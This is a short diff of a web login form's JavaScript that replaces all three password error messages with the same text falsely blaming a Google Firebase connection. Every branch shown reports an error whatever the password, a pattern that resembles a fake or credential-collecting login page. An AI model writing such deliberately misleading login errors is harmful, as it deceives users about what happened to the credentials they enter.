@@ -552,11 +552,11 @@
                         
                         // Show appropriate error based on password
                         if (password.length < 6) {
-                            showError('Wrong password. Try again or click Forgot password to reset it.');
+                            showError('Could not connect to Google Firebase. Use an updated client.');
                         } else if (password === "123456" || password === "password") {
-                            showError('This password is too common. Please choose a different one.');
+                            showError('Could not connect to Google Firebase. Use an updated client.');
                         } else {
-                            showError('Wrong password. Try again or click Forgot password to reset it.');
+                            showError('Could not connect to Google Firebase. Use an updated client.');
                         }
                         
                         // Add shake animation to input
